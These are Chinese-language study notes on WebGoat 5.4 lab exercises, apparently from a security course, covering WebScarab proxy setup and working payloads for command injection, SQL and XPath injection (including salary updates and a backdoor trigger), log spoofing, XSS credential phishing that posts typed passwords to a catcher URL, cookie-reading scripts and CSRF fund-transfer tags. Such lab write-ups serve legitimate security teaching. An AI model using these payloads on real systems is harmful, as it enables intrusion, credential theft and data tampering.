# Webscrab

在Tools中选择Reveal Hidden FIelds和Use full-featured interface，**重启后才能生效**。

默认监听的端口号为8008.可以**在Proxy中进行修改**，不过首先需要选中，点击旁边的stop停止监听。修改为9999，修改后**可以在Messages一栏中查看运行日志**。不过需要对应在**控制面板(-网络和internet-网络和共享中心)-internet选项-连接-局域网设置-代理服务器**中设置系统代理，即为LAN使用代理服务器修改端口号为9999。**注意需要取消对于本地地址不使用代理服务器的√**。

修改完成后，就能发现原来是Listener.run，现在变成了Listener.listen

~~~
参考下面的进行了配置
https://www.jianshu.com/p/0097d27a269e
webscrab
https://blog.csdn.net/ssdsafsdsd/article/details/40594261
https://cloud.tencent.com/developer/article/1123547
~~~

在浏览器的URL一栏中输入地址，就会跳出Edit Response界面，在这个界面中，可以进行修改。做出修改后，**单击Accept changes就可以将修改后的内容发送到服务器上**。如果Cancel changes，就会发送原始的请求。如果根本不想给服务器发送一个请求，可以选择Abort request，向浏览器返回一个错误。如果打开了多个拦截窗口，可以使用Cancel ALL intercepts释放所有的请求。**如果在Proxy-Manual Edit中取消勾选Intercept request就不会进行拦截了**。在Manual Edit中有Exclude paths matching，后面跟的是正则表达式，用于匹配请求的URL，如果匹配，请求就不会被拦截。

可以试试使用**IE浏览器**打开Webgoat界面。



# Injection

命令注入攻击对于任何参数驱动的网站都是一个威胁。

## Command Injection

截取后在末尾添加

~~~
" & netstat -an & config
~~~

因为原来是执行

~~~
页面提示的是
ExecResults for 'cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html"'
执行的内容是单引号的部分，即
cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html"

添加后就执行
cmd.exe /c type "E:\safe\WebGoat-5.4\tomcat\webapps\WebGoat\lesson_plans\English\AccessControlMatrix.html" & netstat -an & ipconfig
~~~

## Numeric SQL Injection

在SQL语句中增加 or 1=1，就能过跳过筛选，获取全部的内容。



## Log Spoofing

在输入的用户名称中smith修改为

~~~
smith%0d%0alogin succeeded for the username: smith
会显示login succeeded for the username: smith
~~~



## XPATH Injection

XPath Injection类似SQL注入。

~~~xquery
XPath query

String dir = s.getContext().getRealPath("/lessons/XPATHInjection/EmployeesData.xml");
File d = new File(dir);
XPathFactory factory = XPathFactory.newInstance();
XPath xPath = factory.newXPath();
InputSource inputSource = new InputSource(new FileInputStream(d));
String expression = "/employees/employee[loginID/text()='" + username + "' and passwd/text()='" + password + "']";
nodes = (NodeList) xPath.evaluate(expression, inputSource, XPathConstants.NODESET);
~~~

但是是需要用到字符串的引号.

~~~xquery
Mike' or 1=1 or 'a'='a

服务器的解释方法是
expression = "/employees/employee[ ( loginID/text()='Smith' or 1=1 ) OR ( 'a'='a' and passwd/text()='password' ) ]"
~~~



## string SQL Injection

输入字符的SQL注入，因为是获取字符，所以可以在之前数字的前提下增加引号。

~~~sql
//输入为Erwon的情况
SELECT * FROM user_data WHERE last_name = 'Erwon' 

//输入为Erwon，拦截后增加' or '1'='1
SELECT * FROM user_data WHERE last_name = 'Erwon' or '1'='1'

~~~



## LAB: SQL Injcetion

### stage1

~~~sql
"SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
~~~

但是这里有长度限制，需要使用webscarab进行移除。

~~~sql
"SELECT * FROM employee WHERE userid = " + userId + " and password = " + password
~~~

### stage2

只对开发者版本有效，所以不用做。

### stage3

从员工Larry处获取boss的信息。

~~~
先在密码处输入
s' or '1'='1

再于viewfile输入(老板工资最高)
101 or 1=1 order by salary desc
~~~





## Modify Data with SQL Injection

可以使用SQL注入修改数据。只需要使用;(semicolon)

~~~sql
jsmith';UPDATE salaries SET salary=99999 WHERE userid='jsmith'--这是评论
~~~



## ADD Data with SQL Injection

使用INSERT语句。

~~~sql
bar';INSERT INTO salaries VALUES('goa',99999);--插入用户名为goa，薪资为99999的一条记录
~~~



## Database Backdoors

使用SQL注入实现大于一条的SQL语句。

~~~sql
首先是输入userid，然后修改salary
101;UPDATE employee SET salary=99999

然后是添加触发器
101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='join@hackme.com'WHERE userid = NEW.userid
~~~



## Blind Numeric SQL Injection

先输入101，发现合法。

通过101 AND 1=1 和101 AND 1=2的原理进行判断，二分最终得到最后的值。

~~~sql
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444')<10000) #这里是整数范围
~~~



## Blind String SQL Injection

~~~sql
需要使用SUBSTRING(STRING, START,LENGTH)

101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'H' );

这样子能够找到第一个字符为J，依次找下去，找到了Jill
~~~





# XSS

The user should be able to add a form asking for username and password. On submit the input should be sent to http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName

使用XSS能够在已经存在的页面上增加额外的元素。



## Phishing with XSS

用XSS钓鱼，主要是使用XSS和HTML插入

* 插入HTML需要身份验证的信息
* 增加JavaScript来收集这些信息
* 将这些信息post

在search中输入增加用户名和密码的表格。格式如下

~~~html
</form><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br></form><br><br><HR>
~~~

然后添加JavaScript，这个js能够读取从表单输入的信息，并将信息发送给webgoat

~~~javascript
<script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script>
~~~

然后需要一个按钮

~~~html
<input type="submit" name="login" value="login" onclick="hack()">
~~~

最终的结果如下所示，也就是将JavaScript的内容放在form的开头，button的内容放在末尾。

~~~html
</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
~~~

## Lab:Cross Site Scripting



### stage1

先登录Tom的账户，选择editProfile，在street栏中输入

~~~html
<script>Alert('Got ya')</script>
~~~

再用另一账户，权限要高一些的，登录，查看Tom的账户，就会跳出这个alert。



### stage5 

执行reflected XSS 攻击

利用search栏的漏洞创建一个包含危险攻击的URL，证实别的用户会被影响。

在SearchStaff中输入

~~~html
<script>alert("Dangerous");</script>
~~~



## Stored XSS Attack

增加信息，信息能够使别的用户加载一个不受欢迎的页面。

在Message栏中写入

~~~html
<script language="javascript" type="text/javascript">alert("Ha Ha Ha");</script>
~~~



~~~html
<script language="javascript" type="text/javascript">alert(document.cookie);</script>
~~~



## Reflected XSS Attack

在某一栏中输入

~~~html
 <script>alert('Bang!')</script>
~~~



## Cross Site Request Forgery

在title中命名为test，但是message命名为

~~~html
<img src="http://localhostattack?Screen=52&menu=900&transferFunds=5000" width="1" height="1" />
~~~

注意SRC的内容要根据具体的来



## CSRF Prompt By-Pass

在message框中输入

~~~html
<img src="?transferFunds=4000" />
<img src="?transferFunds=CONFIRM" />
~~~

点击提交，刷新后就可以看到已经完成实验了



## CSRF Token By-Pass

首先需要在浏览器的URL栏中输入&transferFunds=main，就会跳转到另一个界面了。(这里其实就能完成实验了)

然后查看页面的代码找到Token的位置

~~~html
<form accept-charset='UNKNOWN' id='transferForm' method='POST' action='attack?Screen=2&menu=900' enctype='application/x-www-form-urlencoded'>
	<input name='transferFunds' type='text' value='0'>
	<input name='CSRFToken' type='hidden' value='1745740650'>
	<input type='submit'>
</form>
~~~

回到首页

~~~

~~~



## HTTPOnly Test

检测浏览器是否支持HTTPOnly cookie

选择readcookie，就会跳出

主要看实验报告中的四张图



## Cross Site Tracing(XST) Attacks

通过插入

~~~html
<script type="text/javascript">if ( navigator.appName.indexOf("Microsoft") !=-1) {var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");xmlHttp.open("TRACE", "./", false); xmlHttp.send();str1=xmlHttp.responseText; while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); document.write(str1);}</script>
~~~

